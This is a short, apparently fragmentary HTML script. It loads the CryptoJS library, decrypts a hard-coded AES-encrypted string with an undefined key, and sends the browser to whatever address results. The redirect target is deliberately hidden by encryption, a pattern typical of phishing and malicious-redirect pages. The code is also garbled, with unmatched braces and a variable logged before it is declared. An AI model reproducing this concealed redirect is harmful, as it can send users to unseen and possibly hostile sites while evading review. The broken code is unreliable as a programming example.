<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>

<script>

    console.log(encrypted);
  }

    var encrypted = "U2FsdGVkX1+AtBPwUHLvxhahIzJI+6vZvBSMiOhZpswF7CM9VjwNrK1A8VRFag9wGLeSd4khW04SjQCCbud80cDJ9EouHoRKkOqtl8T6t5eqBD8dqRnnlGKKt75n11jSTBSV8m4T4BFWvVOel+hK0Q==";
    var unencrypted = CryptoJS.AES.decrypt(encrypted, aeskey).toString(CryptoJS.enc.Utf8);
    window.location.href = unencrypted;
  }
</script>
